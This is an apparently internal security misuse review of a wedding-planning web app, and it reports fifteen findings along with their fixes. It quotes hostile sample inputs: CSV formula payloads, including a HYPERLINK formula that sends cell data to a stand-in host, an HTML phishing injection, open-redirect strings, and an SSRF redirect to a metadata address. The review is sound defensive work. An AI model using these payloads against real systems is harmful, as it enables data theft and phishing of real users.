# Misuse review — what happens when people don't use the app as intended

Adversarial pass over every entry point: 15 route handlers, 24 server-action
files, 10 RPCs, the guest RSVP flow, and the public site. The question asked of
each was not "does this work" but "what does it do when someone lies to it".

**Method.** Where a claim could be settled by execution it was: URL parsing, the
prototype chain, CSV serialisation, schema constraints, enum values. Those are
marked **verified**. Where the finding needed an authenticated session to
demonstrate end-to-end it is marked **read, not executed** — the logic is quoted
so it can be checked, but nobody has actually run the exploit. I cannot sign in,
so no authenticated path here has been exercised against a live database.

There is no `middleware.ts`. Every gate is per-action, which is why the failures
below cluster around actions that forgot one.

---

## Status — all 15 fixed

Each finding below keeps its original text so the reasoning stays auditable;
the fix is summarised here.

| | Finding | Fix |
|---|---|---|
| M1 | Workspace takeover | `getPrimarySite` prefers a site the user **owns**; and collaborators are now invited, not inserted — see 0021 below |
| M2 | Revoke did nothing | Session payload now carries `tokenId` + `exp`; `loadGuestSession` re-reads the token row on every use |
| M3 | CSV formula injection | `toCsv` prefixes `'` to cells starting `= + - @`, tab or CR |
| M4 | Paywall bypass | Unlock check moved **inside** `publishSnapshot`, against the site being published; `saveAndPublish` refuses a foreign `siteId` |
| M5 | Email HTML injection | `escapeHtml` at every interpolation in all three templates; send capped at 60/site/hour |
| M6 | SSRF via redirect | `redirect: 'manual'` with per-hop DNS + private-range validation; size capped **while streaming** |
| M7 | Open redirect | `safeNextPath` accepts only single-slash paths, resolved through `new URL(next, origin)` |
| M8 | Unbounded RSVP writes | Submissions/choices/answers bounded before the loop |
| M9 | No length limits | App-level clamps **and** migration `0020_input_bounds.sql` |
| M10 | Limiter flushable | LRU eviction of expired-then-oldest, never a global `clear()` |
| M11 | `pending` bypass | Status validated against an explicit submittable set |
| M12 | Prototype chain | `Object.hasOwn` |
| M13 | Two slug lists | One `lib/reserved-slugs.ts`, imported by signup and router |
| M14 | 50-user ceiling | Look up `profiles` by email, then paginate `listUsers` |
| M15 | SVG in public bucket | Magic-byte sniffing; the **sniffed** type is stored, SVG refused |

**`scripts/test-misuse.mjs`** (`npm run test:misuse`) locks in M2, M3, M5, M7,
M12 and M13, plus the invite flow's address check — 59 assertions that feed hostile input to the real modules. It
needs no database, so it runs in CI on every push including fork PRs. The
remaining findings are structural (a moved check, a bounded loop) and are
covered by typecheck plus the existing suites.

### Database state

`0020_input_bounds.sql` is **applied to production** (2026-08-02). A read-only
pre-flight found zero violating rows across all six constraints first, so the
`validate` could not abort; each constraint was then confirmed present,
`convalidated`, and actually rejecting a violating write (tested inside a
transaction and rolled back).

Two things surfaced while doing it:

- **0019 was already live.** All three restored guards are present in the
  deployed `submit_response` body, so the RSVP validation gap closed at some
  point after the 25 July deploy of 0018.
- **`schema_migrations` had drifted.** `db-apply.mjs` only records migrations
  when run with no arguments; both 0019 and 0020 were applied by explicit
  filename, so the tracker stopped at 0018 while the database was two ahead.
  Both are now recorded. Worth knowing for next time: applying a single file by
  name never updates the tracker.

### Collaborator consent — now built (0021)

M1's second half is closed too. `addCollaborator` is gone; `inviteCollaborator`
writes a pending row and emails a link, and nothing exists for the invitee
until they sign in as the invited address and accept.

- **The link is not a capability.** `accept_collaborator_invitation` locks the
  row, re-checks revoked/accepted/expired, and requires the signed-in email to
  match the invitation. A forwarded email gets somebody nowhere.
- **No accounts are created for strangers.** The old code called
  `auth.admin.createUser({ email_confirm: true })` on whatever was typed in the
  box. It no longer creates anything for anyone who has not asked.
- **Invitations are visible and withdrawable.** Settings now lists who has
  access and who has been asked, with Remove and Withdraw. Previously there was
  an add box and no list — no way to see or undo access.
- **Ownership cannot be granted.** A CHECK constraint restricts invited roles
  to collaborator/viewer, so no invitation can hand over a wedding.
- **The invite page never leaks the address.** `peek_collaborator_invitation`
  returns it masked (`p***@example.com`), so someone holding a link learns
  which inbox to use without it becoming an address harvest.

Verified against the live schema with a throwaway org, rolled back: RLS on,
both policies present, both functions security-definer, accept refuses with no
signed-in user, owner-role invites rejected, one live invitation per address
enforced, revoke frees the address for a fresh invite, expiry reported
correctly. `npm run test:misuse` covers the mask comparison and the reserved
`/invite` slug.

Migrations 0020 and 0021 are both applied and recorded.

Existing guest cookies are invalidated by the M2 change (they lack `tokenId`
and `exp`, and are rejected rather than grandfathered). Anyone mid-RSVP reopens
their invitation link. On a pre-launch database that is nobody.

---

## P0 — fix before launch

### M1. Anyone who knows your email can take over your workspace — FIXED
`app/(app)/settings/actions.ts:72` · **read, not executed**

`addCollaborator` takes an email, creates a *confirmed* auth user for it if none
exists, and inserts a `memberships` row — with no invitation, no acceptance step
and no notification to the person being added.

Now read `lib/workspace.ts:16`:

```ts
.from('sites').select(...)
.order('created_at', { ascending: true })   // OLDEST first
.limit(1).maybeSingle()
```

`getPrimarySite()` returns the **oldest site the user can access**, and there is
no site switcher in the UI ("Phase 1 assumes one site per founder").

Chain them:

1. Attacker's org was created before the victim's.
2. Attacker calls `addCollaborator("victim@example.com")`.
3. Victim now has RLS access to the attacker's site, which is older than theirs.
4. Victim opens the app. Every screen — guests, budget, website editor, exports —
   now resolves to **the attacker's site**. Their own wedding is unreachable,
   because nothing in the UI can select a different site.

The attacker gains no read access to the victim's data (membership only flows one
way), so this is hijack and lock-out rather than theft. That still means a
stranger with your email address can make your wedding disappear from your
dashboard the week before it.

**The likelier version of this is an accident, and it is close to certain.** A
wedding planner or a parent gets added as a collaborator — the feature working
exactly as designed — and if the planner's org is older, the couple's own site
silently vanishes from their account. Same for any couple who is a collaborator
on a friend's wedding created earlier. This will generate support tickets in
normal use, with no fix available to the user.

Fix: an invitation the recipient accepts; a site switcher; and primary-site
selection that prefers a site the user *owns* over one they merely collaborate on.

### M2. Revoking an invitation link does nothing once it has been opened — FIXED
`lib/guest-session.ts` + `app/s/[siteSlug]/i/[token]/route.ts:44` · **read, not executed**

The token route checks `revoked` and `expires_at` correctly. It then issues a
cookie whose signed payload is:

```ts
{ householdId, siteId }    // no expiry, no token reference, no version
```

The HMAC is otherwise well built — `timingSafeEqual`, length-checked, and it
refuses to sign without `GUEST_SESSION_SECRET`. But nothing in the payload ties
it back to the token that minted it, and nothing expires.

So after the first open, the cookie is a **permanent, unrevocable credential**:

- Revoking the link (`invite_tokens.revoked = true`) does not lock the holder out.
- `expires_at` on the token is irrelevant.
- Removing the guest from the household doesn't help — `submitGuestRsvp` re-reads
  household membership, but the session itself still authenticates.
- The 180-day `maxAge` is a *client-side* hint. Anyone who copied the cookie value
  keeps it forever.

This matters because revoke exists precisely for "we sent it to the wrong
address" and "the link got posted in a WhatsApp group". Right now that button
reassures without doing anything.

Fix: put `tokenId` and an `exp` in the signed payload; verify the token row is
still live on each use, or at least re-check on a short interval.

### M3. Guests can put spreadsheet formulas in the sheet you hand your caterer — FIXED
`lib/csv.ts:5` · **verified**

`toCsv` implements RFC 4180 quoting correctly — and that is the whole problem, because
RFC 4180 has nothing to say about formulas:

```
"=cmd|'/c calc'!A1"          -> csv cell: =cmd|'/c calc'!A1
"@SUM(1+1)"                  -> csv cell: @SUM(1+1)
"=HYPERLINK(\"https://evil.tld?d=\"&A1,\"Click\")"
                             -> csv cell: "=HYPERLINK(""https://evil.tld?d=""&A1,""Click"")"
```

The last one is quoted, which does *not* help: the CSV parser strips the quotes
and hands Excel a cell beginning with `=`.

The input is guest-controlled. `question_type` defaults to `'text'`
(`0002_rsvp_foundation.sql:28,37`), and migration 0019 validates options only for
`single_choice`, `meal_choice`, `multi_choice` and `yes_no` — a `text` answer is
stored verbatim. It flows into `rsvps.csv` at
`app/(app)/rsvps/export/route.ts:59`, the file the docstring describes as
"the sheet a couple hands to their caterer".

`csvResponse` also prefixes a UTF-8 BOM, which makes Excel open it directly
rather than through the import wizard — removing the one step that would have
shown the user what they were opening.

Fix: prefix a `'` to any cell starting with `= + - @`, tab or CR. Four characters
of guard in one function.

---

## P1 — fix before you take real money

### M4. `saveAndPublish` checks one site's entitlement and publishes another — FIXED
`app/(app)/website/actions.ts:193` · **read, not executed**

```ts
export async function saveAndPublish(siteId: string, pageId: string, data: SiteData) {
  const workspace = await getPrimarySite()
  if (!workspace?.isUnlocked) return { error: 'locked', locked: true }
  const res = await publishSnapshot(siteId)      // ← client-supplied, not workspace.siteId
```

`publishSnapshot` uses the RLS client and its own docstring says "Caller checks
unlock" — it does not check. RLS blocks *cross-org* publishing, so this is not a
tenant break. But any user who can access two sites where one is unlocked can
publish the locked one:

- Friend A pays £149 and adds Friend B as a collaborator.
- B's primary site is now A's unlocked one; the gate passes.
- B calls `saveAndPublish(B_own_locked_site_id, …)` and publishes free.

Note M1 makes the "access two sites" precondition trivial to arrange.

`publishSiteNow` in `app/(app)/actions.ts:46` gets this right — it uses
`workspace.siteId`. `sendInvitation` has the same split as `saveAndPublish`:
gate on `getPrimarySite()`, act on a client-supplied `householdId`.

Fix: gate and act on the same id. Better, move the unlock check inside
`publishSnapshot` so it cannot be forgotten again.

### M5. The invitation email is a phishing relay on your verified domain — FIXED
`lib/email.ts:52-59` · **verified by reading the template**

```ts
<p …>${opts.siteName}</p>
<p …>Dear ${opts.householdName},</p>
```

Both are user-controlled and interpolated raw — there is no HTML-escaping helper
anywhere in the codebase. A household name of
`</p><a href="https://phish.tld">Confirm your card to reserve your seat</a><p>`
renders as markup.

On its own that is a couple attacking their own guests. What makes it worse:

- `sendInvitation` has **no rate limit** (the only three `rateLimit` call sites are
  token redemption, RSVP submit and image search).
- Recipient addresses are just rows the user typed into the guest list — they
  need no relationship to any real wedding.

So one £149 unlock buys arbitrary HTML, sent to arbitrary addresses, from
Simvites' SPF/DKIM-authenticated domain. The cost lands on your sender
reputation, and it is your domain that gets blocklisted.

Fix: escape both interpolations; cap sends per site per hour; and keep a
deliverability eye on new accounts sending to many distinct domains.

### M6. SSRF: the host check doesn't survive a redirect — FIXED
`app/(app)/website/actions.ts:36-52` · **read, not executed**

```ts
if (/^(localhost$|\d+\.\d+\.\d+\.\d+$|\[)/i.test(parsed.hostname)) return { error: … }
res = await fetch(parsed, { redirect: 'follow', … })
```

The hostname is validated once, on the URL the user supplied. `redirect: 'follow'`
then follows wherever that host points — so `https://attacker.tld/x` returning
`302 → http://169.254.169.254/latest/meta-data/` is fetched with no further
checks. The blocklist also only catches dotted-quad IPv4; `https://2130706433/`
is 127.0.0.1 in decimal form.

Response bodies only get stored when the content-type is `image/*`, which limits
exfiltration — but timing and error differences still make this an internal port
scanner, and any internal endpoint serving an image type gets copied into a
**public** bucket.

Second bug on the same path:

```ts
const buf = await res.arrayBuffer()
if (buf.byteLength > 15 * 1024 * 1024) return { error: 'too large' }
```

The cap is checked *after* the whole body is in memory. A hostile host streaming
10 GB OOMs the function before the check runs.

Fix: `redirect: 'manual'` and re-validate each hop; reject private ranges after
DNS resolution; check `content-length` and stream with a hard cap.

### M7. Open redirect in the auth callback — FIXED
`app/auth/callback/route.ts:11,17` · **verified**

```ts
const next = searchParams.get('next') ?? '/dashboard'
return NextResponse.redirect(`${origin}${next}`)
```

String concatenation, no validation. Measured:

```
"/dashboard"        -> https://simvites.co.uk/dashboard        host= simvites.co.uk
"//evil.com"        -> https://simvites.co.uk//evil.com        host= simvites.co.uk   (safe)
"@evil.com"         -> https://simvites.co.uk@evil.com         host= evil.com         ← redirects off-site
"\t@evil.com"       -> …                                        host= evil.com
```

`simvites.co.uk` is parsed as userinfo and `evil.com` as the host.

Mitigating: it only fires after a successful `exchangeCodeForSession`, so an
attacker needs a valid code — this is not a one-click phish today. It is still an
unvalidated redirect on the auth path, which is the worst place to keep one.

Fix: `if (!next.startsWith('/') || next.startsWith('//')) next = '/dashboard'`.

---

## P2 — real, lower blast radius

### M8. One RSVP request can trigger unbounded database writes — FIXED
`app/s/[siteSlug]/rsvp/actions.ts:86` · **read, not executed**

```ts
for (const s of submissions) {
  for (const choice of s.choices) {
    await db.rpc('submit_response', …)   // sequential, one round-trip each
```

Neither `submissions` nor `choices` is length-checked. The rate limit is 10
requests/minute per household, but each request carries an arbitrary number of
RPC calls — so the real ceiling is the request body size, not the limiter. Each
call takes a `for update` lock on the event row, so this also serialises other
guests' submissions.

Fix: cap both arrays (a household has maybe 8 guests × 8 events), and batch.

### M9. Nothing in the schema has a length limit — FIXED
**verified** — `grep -rn "varchar(\|length(\|char_length" supabase/migrations/*.sql` returns nothing.

Every text column is unbounded `text`, and `rsvp_answers.value` is unbounded
`jsonb`. The app caps the RSVP message at 1000 chars and the slug at 40; answers,
guest names, household names and site titles are capped nowhere at any layer. A
guest can store megabytes per answer, and M8 multiplies it.

### M10. The rate limiter can be flushed for everyone — FIXED
`lib/rate-limit.ts:11` · **verified by reading**

```ts
if (buckets.size > 10_000) buckets.clear()   // bound memory
```

Keys include `token:${clientIp}`, and `clientIp` reads the first value of
`x-forwarded-for` — attacker-controlled unless a trusted proxy overwrites it.
Spraying 10,000 distinct spoofed IPs clears the whole map, resetting *every*
bucket including other users' RSVP and image-search limits. Fixed-window
counting also allows a 2× burst across a window boundary.

This compounds the known per-instance-memory limitation (readiness #13).

### M11. A guest can un-RSVP themselves back to "pending" — FIXED
`app/s/[siteSlug]/rsvp/actions.ts` · **verified** (`rsvp_status` = `pending|attending|declined`, `0001_occasio.sql:15`)

`EventChoice.status` is typed `'attending' | 'declined'`, and the client filters
`'pending'` out at `rsvp-flow.tsx:113` — but types are erased and the server action
re-validates nothing. `'pending'` is a legal enum value, and `submit_response`
applies capacity, allocation and required-answer checks only when
`p_status = 'attending'`.

So a crafted submission can reset a guest to "never responded" after the fact,
skipping every guard. It corrupts the couple's counts rather than exposing data.

Fix: `if (choice.status !== 'attending' && choice.status !== 'declined') continue`.

### M12. `in` walks the prototype chain — FIXED
`app/(app)/actions.ts:19` · **verified**

```ts
const RESTORABLE = { guests: …, tasks: …, budget_items: …, vendor_payments: … }
if (!(table in RESTORABLE)) return { error: 'Not restorable.' }
```

Measured: `'__proto__' in RESTORABLE`, `'toString' in RESTORABLE` and
`'constructor' in RESTORABLE` are all **true**. The allowlist is bypassable.

It fails safe today — `supabase.from('toString')` 404s at PostgREST and the
function returns before `revalidatePath` — so this is hygiene, not a hole. But
the allowlist is not doing what it reads as doing.

Fix: `Object.hasOwn(RESTORABLE, table)`.

### M13. Two different reserved-slug lists disagree — FIXED
**verified**

| | list |
|---|---|
| `app/onboarding/actions.ts:15` (signup) | `www app api admin dashboard login auth onboarding i s` |
| `lib/tenant.ts:16` (subdomain routing) | `www app api admin mail assets` |

`mail` and `assets` are blocked by the router but **not** at signup. A couple can
claim either slug, and `mail.simvites.co.uk` then resolves to the marketing site —
their wedding is unreachable on its own address, with no error explaining why.

Fix: one exported list, imported by both.

### M14. Adding an existing collaborator breaks past 50 users — FIXED
`app/(app)/settings/actions.ts:86` · **read, not executed**

```ts
const { data: list } = await admin.auth.admin.listUsers()
userId = list?.users.find(u => u.email === email)?.id
```

`listUsers()` is paginated and defaults to the first 50 users. Once the platform
has more than that, adding a collaborator who already has an account fails with
"Could not create that account." for anyone outside page one — an error that
grows more common the more successful you are, and says nothing useful.

Also a mild account-enumeration oracle: the message differs for existing vs new
addresses.

Fix: `listUsers({ page, perPage })` in a loop, or query `profiles` by email.

### M15. SVG uploads land in a public bucket with an executable content type — FIXED
`app/(app)/website/actions.ts:12-29` · **read, not executed**

`file.type` is client-supplied and never checked against magic bytes;
`startsWith('image/')` admits `image/svg+xml`, which is stored with that
content-type in the **public** `site-assets` bucket. SVG can carry `<script>`,
so fetching the object executes it — on the Supabase storage origin rather than
yours, which contains the damage, but it is a script-hosting primitive on
infrastructure that carries your name.

Fix: sniff magic bytes; either reject SVG or re-serve it as
`Content-Disposition: attachment` / `image/png` after rasterising.

---

## What held up

Worth recording, because these are the places the obvious attack fails:

- **Tenant isolation.** Every `(app)` action but four uses the RLS-scoped client,
  and the four service-role paths were checked individually. `files/[fileId]/download`
  gets the hard one exactly right: the row is read with the *caller's* session so
  RLS proves membership, and only then does the service role mint a 60-second
  signed URL.
- **Guest identity.** `submitGuestRsvp` re-reads household membership from the DB
  and rejects any `guestId` outside it — a forged id from another household dies
  there, not in the RPC.
- **The RSVP RPC.** Post-0019 it re-enforces invitation, capacity (under a row
  lock), allocation, deadline, question scope and required answers server-side.
  It does not trust the caller.
- **Cookie signing.** HMAC-SHA256, `timingSafeEqual`, length pre-check, and it
  throws rather than falling back to a default secret.
- **`image-search`.** Auth-gated, rate-limited, query capped at 80 chars,
  `encodeURIComponent`, fixed upstream hosts. No user-controlled URL.
- **Admin.** `requirePlatformAdmin()` throws before any client is constructed.
- **XSS in the app and public site.** The only `dangerouslySetInnerHTML` is the
  app's own theme script. React escapes everything else.

---

## Suggested order

1. **M1** — it is the only one a stranger can fire with nothing but an email
   address, and it is going to happen by accident regardless.
2. **M3, M7, M12, M13** — one-line fixes, an hour together.
3. **M2** — needs a payload change and a re-check on use; the revoke button is
   currently decorative.
4. **M5, M4** — escaping plus moving two gates.
5. **M6** — the redirect fix is small; the streaming cap is more work.
6. P2 as capacity allows. **M8 and M9 are one afternoon** and remove a whole
   class of resource abuse.

None of the P0s were caught by the existing suites, because both test the happy
path with well-formed input. `test:rsvp` would catch M11 with one added
assertion.
